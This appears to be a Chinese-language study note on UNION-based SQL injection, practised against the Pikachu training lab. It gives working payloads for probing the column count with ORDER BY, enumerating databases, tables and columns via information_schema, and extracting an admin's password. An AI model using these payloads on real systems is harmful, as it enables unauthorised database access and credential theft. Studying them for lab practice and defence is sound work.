# union联合查询

## 一、原理

union联合查询，是调用数据库中的union语句进行复杂信息的查询，若程序没有对union进行过滤，则会泄露大量的信息，造成极大的危害。

## 二、应用

### sql语句

```
select username,password from usr where id=1 union select 字段1，字段
2 from 表
```

注意，union查询的字段数应该与前文保持一致，否则会报错

### 字段数查询

查询字段的数量需要使用order by函数使用二分法进行查询

拿前文中的字符型注入为例

```
payload:lll'order by 4#
```

经过测试，查询得到为两个字段

### 使用union

使用union进行查询，本次查询数据库和用户

```
payload：lll' union select database(),user()#
```

同理也可以查询版本version()

## 三、逐层查询

### 1、查数据库

```
union select 1，database()#

查询所有数据库
union select 1，group_concat(schema_name) from information_schema.schemata #
```

***group_concat函数可以将多个字符连接成一个字符。***

### 2.查表名

```
union select 1,table_name from information_schema.tables where table_schema= 'pikachu' limit 0,1#

pikachu也可以使用database()
```

### 3.查字段名

```
union select 1,column_name from information_schema.columns where table_name= 'users'
 limit 0,1#
```

### 4.查数据名

```
union select 1,username from users limit 0,1#


union select 1,password from users where username='admin' limit 0,1#
```
